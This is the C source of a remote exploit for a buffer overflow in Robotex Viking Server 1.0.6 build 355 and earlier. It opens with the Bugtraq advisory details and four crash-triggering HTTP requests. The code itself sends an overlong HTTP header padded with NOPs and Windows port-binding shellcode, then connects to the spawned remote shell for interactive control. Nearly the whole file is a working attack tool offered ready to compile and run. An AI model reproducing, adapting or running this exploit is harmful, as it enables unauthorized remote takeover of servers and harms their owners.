/*

 Robotex Viking Server Buffer Overflow Vulnerability
 Xploit by wildcoyote@coders-pt.org

 Accoding to bugtraq advisory....
 Bugtraq id        : 1614 
 Class             : Boundary Condition Error 
 Cve               : GENERIC-MAP-NOMATCH 
 Remote            : Yes 
 Local             : Yes 
 Published         : August 28, 2000 
 Vulnerable        : Robotex Viking Server 1.0.6 Build 355 and prior
                     - Microsoft Windows 95
                     - Microsoft Windows NT 4.0
 Not vulnerable    : Robotex Viking Server 1.0.6 Build 370 and above
                     - Microsoft Windows 95
                     - Microsoft Windows NT 4.0

 The following commands will crash Viking Server:

 1)
 GET [x11765] HTTP/1.1<enter><enter>

 2)
 GET / HTTP/1.1<enter>
 Unless-Modified-Since: [x14765]<enter><enter>

 3)
 GET / HTTP/1.1<enter>
 If-Range: [x14765]<enter><enter>

 4)
 GET / HTTP/1.1<enter>
 If-Modified-Since: [x14765]<enter><enter>

 Compile with: gcc RoboVikiXploit.c -o RoViX

 Comments : Yeah...I KNOW, i could have coded this longer'ago...but i've
            been kind of away ;P heh
            So...about one week'after being posted...here's tha exploit ;)

 Greetz to: I would like to dedicate'this code to my "new" friendz from
            last sunday when'#coders got together... ;)
            (in no particulary order :])
            Myke,Arsox,lucipher,mortiis,SamWise,Branc0,String,|Yzfr1|,
            Residdent,Net_phreak,NetCyborg,RedBaron (or something), and...
            i think'im not forgetting anybody :]
            If so, FLAME ME! I WAVE IT ;) heh
            Well..why not send a hug to my other'friendz at PTNET? :]
            niness, [medusa], pheer, ping, buffer, Badfile, jynx,
            nopinyp, X-raver, lunatic, Dalailama, errr...so many ppl
            I'll just /quote PRIVMSG *!*@* I WAVE YOU ALL! ;)
*/

#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

struct RoboVikiXploiting_ways {
  char *Xploit_way;
  int port;
  char *command;
  int overflow_string_size;
};

struct RoboVikiXploiting_ways RoboVikiXploiting_ways[]={
  {"Robotex Viking Server simple HTTP Overflow",80,"GET BO HTTP/1.1\n\n",11765}, 
  {"Robotex Viking Server [Unless-Modified-Since] HTTP Overflow",80,"GET / HTTP/1.1\nUnless-Modified-Since: BO\n\n",14765},
  {"Robotex Viking Server [If-Range] HTTP Overflow",80,"GET / HTTP/1.1\nIf-Range: BO\n\n",14765},
  {"Robotex Viking Server [If-Modified-Since] HTTP Overflow",80,"GET / HTTP/1.1\nIf-Modified-Since: BO\n\n",14765},
  {NULL,0,NULL,0}
};

#define NOP                               0x90
#define PORT_LOCATION                      524 // Port will be injected on
                                               // byte'shellcode + 524
// Leet Port Binder'shellcode for Win b0xez...
char shellcode[] =
  "\x4b\x8b\xc3\xbb\x01\x90\x16\x01\xc1\xeb\x02\x8b\xf8\x33"
  "\xc0\x50\x48\x90\x50\x59\xf2\xaf\x59\xb1\xc6\x8b\xc7\x48"
  "\x80\x30\x99\xe2\xfa\x33\xf6\x96\x90\x90\x56\xff\x13\x8b"
  "\xd0\xfc\x33\xc9\xb1\x0b\x49\x32\xc0\xac\x84\xc0\x75\xf9"
  "\x52\x51\x56\x52\xb3\x80\x90\x90\xff\x13\xab\x59\x5a\xe2"
  "\xec\x32\xc0\xac\x84\xc0\x75\xf9\xb3\x01\x4b\x90\x56\xff"
  "\x13\x8b\xd0\xfc\x33\xc9\xb1\x06\x32\xc0\xac\x84\xc0\x75"
  "\xf9\x52\x51\x56\x52\xb3\x80\x90\x90\xff\x13\xab\x59\x5a"
  "\xe2\xec\x83\xc6\x05\x33\xc0\x50\x40\x50\x40\x50\xff\x57"
  "\xe8\x93\x6a\x10\x56\x53\xff\x57\xec\x6a\x02\x53\xff\x57"
  "\xf0\x33\xc0\x57\x50\xb0\x0c\xab\x58\xab\x40\xab\x5f\x48"
  "\x50\x57\x56\xad\x56\xff\x57\xc0\x48\x50\x57\xad\x56\xad"
  "\x56\xff\x57\xc0\x48\xb0\x44\x89\x07\x57\xff\x57\xc4\x33"
  "\xc0\x8b\x46\xf4\x89\x47\x3c\x89\x47\x40\x8b\x06\x89\x47"
  "\x38\x33\xc0\x66\xb8\x01\x01\x89\x47\x2c\x57\x57\x33\xc0"
  "\x50\x50\x50\x40\x50\x48\x50\x50\xad\x56\x33\xc0\x50\xff"
  "\x57\xc8\xff\x76\xf0\xff\x57\xcc\xff\x76\xfc\xff\x57\xcc"
  "\x48\x50\x50\x53\xff\x57\xf4\x8b\xd8\x33\xc0\xb4\x04\x50"
  "\xc1\xe8\x04\x50\xff\x57\xd4\x8b\xf0\x33\xc0\x8b\xc8\xb5"
  "\x04\x50\x50\x57\x51\x50\xff\x77\xa8\xff\x57\xd0\x83\x3f"
  "\x01\x7c\x22\x33\xc0\x50\x57\xff\x37\x56\xff\x77\xa8\xff"
  "\x57\xdc\x0b\xc0\x74\x2f\x33\xc0\x50\xff\x37\x56\x53\xff"
  "\x57\xf8\x6a\x50\xff\x57\xe0\xeb\xc8\x33\xc0\x50\xb4\x04"
  "\x50\x56\x53\xff\x57\xfc\x57\x33\xc9\x51\x50\x56\xff\x77"
  "\xac\xff\x57\xd8\x6a\x50\xff\x57\xe0\xeb\xaa\x50\xff\x57"
  "\xe4\x90\xd2\xdc\xcb\xd7\xdc\xd5\xaa\xab\x99\xda\xeb\xfc"
  "\xf8\xed\xfc\xc9\xf0\xe9\xfc\x99\xde\xfc\xed\xca\xed\xf8"
  "\xeb\xed\xec\xe9\xd0\xf7\xff\xf6\xd8\x99\xda\xeb\xfc\xf8"
  "\xed\xfc\xc9\xeb\xf6\xfa\xfc\xea\xea\xd8\x99\xda\xf5\xf6"
  "\xea\xfc\xd1\xf8\xf7\xfd\xf5\xfc\x99\xc9\xfc\xfc\xf2\xd7"
  "\xf8\xf4\xfc\xfd\xc9\xf0\xe9\xfc\x99\xde\xf5\xf6\xfb\xf8"
  "\xf5\xd8\xf5\xf5\xf6\xfa\x99\xce\xeb\xf0\xed\xfc\xdf\xf0"
  "\xf5\xfc\x99\xcb\xfc\xf8\xfd\xdf\xf0\xf5\xfc\x99\xca\xf5"
  "\xfc\xfc\xe9\x99\xdc\xe1\xf0\xed\xc9\xeb\xf6\xfa\xfc\xea"
  "\xea\x99\xce\xca\xd6\xda\xd2\xaa\xab\x99\xea\xf6\xfa\xf2"
  "\xfc\xed\x99\xfb\xf0\xf7\xfd\x99\xf5\xf0\xea\xed\xfc\xf7"
  "\x99\xf8\xfa\xfa\xfc\xe9\xed\x99\xea\xfc\xf7\xfd\x99\xeb"
  "\xfc\xfa\xef\x99\x9b\x99"
  "\xff\xff" // Port Number will be injected here...
  "\x99\x99\x99\x99\x99\x99"
  "\x99\x99\x99\x99\x99\x99\xfa\xf4\xfd\xb7\xfc\xe1\xfc\x99"
  "\xff\xff\xff\xff\x09\x1f\x40\x00\x0d\x0ah";

int
openhost(char *host,int port) {
   int sock;
   struct sockaddr_in addr;
   // Oh yeah...got 2 resolve host information again :]
   struct hostent *he;
   he=gethostbyname(host);
   if (he==NULL) return -1;
   sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
   if (sock==-1) return -1;
   memcpy(&addr.sin_addr, he->h_addr, he->h_length);
   addr.sin_family=AF_INET;
   addr.sin_port=htons(port);
   if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1) sock=-1;
   return sock;
}

void
sends(int sock,char *buf) {
  write(sock,buf,strlen(buf));
}

void
own3dshell(int sock)
{
 char buf[1024];
 fd_set rset;
 int i;
 while (1)
 {
  FD_ZERO(&rset);
  FD_SET(sock,&rset);
  FD_SET(STDIN_FILENO,&rset);
  select(sock+1,&rset,NULL,NULL,NULL);
  if (FD_ISSET(sock,&rset))
  {
   i=read(sock,buf,1024);
   if (i <= 0)
   {
     printf("The connection was closed!\n");
     printf("Exiting...\n\n");
     exit(0);
   }
   buf[i]=0;
   puts(buf);
  }
  if (FD_ISSET(STDIN_FILENO,&rset))
  {
   i=read(STDIN_FILENO,buf,1024);
   if (i>0)
   {
    buf[i]=0;
    write(sock,buf,i);
   }
  }
 }
}

void
VikingXown(char *host, int type, int bind_shell_port)
{
 char *buf, *tmp;
 int sock, i, x, buffer_size, bindshell=bind_shell_port;
 unsigned char *ShellPortOffset;
 printf("Type Number     : %d\n",type);
 printf("Xploit waye     : %s\n",RoboVikiXploiting_ways[type].Xploit_way);
 printf("Port            : %d\n",RoboVikiXploiting_ways[type].port);
 printf("Bind Shell Port : %d\n",bindshell);
 printf("Let the show begin ladyes...\n");
 printf("Connecting to %s [%d]...",host,RoboVikiXploiting_ways[type].port);
 sock=openhost(host,RoboVikiXploiting_ways[type].port);
 if (sock==-1)
 {
  printf("FAILED!\n");
  printf("Couldnt connect...leaving :|\n\n");
  exit(-1);
 }
 printf("SUCCESS!\n");
 printf("Determinating buffer size...");
 buffer_size=(strlen(RoboVikiXploiting_ways[type].command)
             +
             RoboVikiXploiting_ways[type].overflow_string_size);
 printf("DONE! (%d)\n",buffer_size);
 printf("Allocating memory for buffer...");
 if (!(buf=malloc(buffer_size)))
 {
  printf("FAILED!\n");
  printf("Leaving... :[\n\n");
  exit(-1);
 }
 printf("WORKED!\n");
 printf("Allocating memory for temp buffer...");
 if (!(tmp=malloc(RoboVikiXploiting_ways[type].overflow_string_size)))
 {
  printf("FAILED!\n");
  printf("Leaving... :[\n\n");
  exit(-1);
 }
 printf("WORKED TO! (heh)\n");
 for(i=0;
     i<RoboVikiXploiting_ways[type].overflow_string_size-strlen(shellcode);
     i++) tmp[i]=NOP;
 // Now we inject the 16 byte port number on tha shellcode ;)
 ShellPortOffset = shellcode + PORT_LOCATION;
 bind_shell_port ^= 0x9999;
 *ShellPortOffset = (char) ((bind_shell_port >> 8) & 0xff);
 *(ShellPortOffset + 1) = (char) (bind_shell_port & 0xff);
 strcat(tmp,shellcode);
 for(i=0;;i++)
  if ((RoboVikiXploiting_ways[type].command[i]=='B') &&
      (RoboVikiXploiting_ways[type].command[i+1]=='O')) break;
  else buf[i]=RoboVikiXploiting_ways[type].command[i];
 strcat(buf,tmp);
 i+=2;
 for(;i<strlen(RoboVikiXploiting_ways[type].command);i++)
    buf[strlen(buf)]=RoboVikiXploiting_ways[type].command[i];
 printf("Sending EVIL buffer ;)\n");
 sends(sock,buf);
 close(sock);
 printf("Freeing buffers...");
 free(buf);
 free(tmp);
 printf("DONE!\n");
 printf("Trying to binded'shell [%d]...",bindshell);
 sock=openhost(host,bindshell);
 if (sock==-1)
 {
  printf("FAILED!\n");
  printf("Too bad... :[ exiting...\n\n");
  exit(-1);
 }
 printf("W0RK3D! ;)\n");
 printf("Prepare to have an orgazm...(or something like that *g*)\n");
 own3dshell(sock);
 printf("I RULE!\n"); // Heh, nobody will ever'c thiz message, so why not? ;)
}

void
show_types()
{
 int i;
 printf("\n\t\t\t-* Available Typez *-\n\n");
 for(i=0;(RoboVikiXploiting_ways[i].Xploit_way!=NULL);i++)
 {
  printf("Type Number: %d\nXploit Way : %s\nPort : %d\nOverflow string size : %d\n-************************-\n",i
        ,RoboVikiXploiting_ways[i].Xploit_way
        ,RoboVikiXploiting_ways[i].port
        ,RoboVikiXploiting_ways[i].overflow_string_size);
 }
}

main(int argc, char *argv[])
{
 int i;
 // lets keep on (int) var i the number of types ;)
 for(i=0;;i++) if (RoboVikiXploiting_ways[i].Xploit_way==NULL) break;
 i--; // oh shit! Cant forget that'array[0] thingie! :))
 printf("\nRobotex Viking Server 1.0.6 Build 355 and prior by wildcoyote@coders-pt.org\n\n");
 if (argc<4) {
    printf("Sintaxe: %s <host> <type number> <bind shell port> [port (server)]\n",argv[0]);
    show_types();
    printf("\nFlamez to wildcoyote@coders-pt.org\n\n");
 }
 else if (atoi(argv[2])<=i)
       if (argc==4)
        if (atoi(argv[3])>0) VikingXown(argv[1],atoi(argv[2]),atoi(argv[3]));
        else
        {
         printf("Invalid Server Port... [(port_number <= 0)]\n");
         printf("Try again...heh\n\n");
        }
       else
           if ((atoi(argv[3])>0) && (atoi(argv[4])>0))
           {
            RoboVikiXploiting_ways[atoi(argv[2])].port=atoi(argv[4]);
            VikingXown(argv[1],atoi(argv[2]),atoi(argv[3]));
           }
           else
           {
            printf("Invalid Server/Bind Shell Port... [(port_number <= 0)]\n");
            printf("Try again...heh\n\n");
           }
      else
      {
        printf("Invalid type value (max type=%d)\n",i);
        show_types();
        printf("\n\n");
      }
}
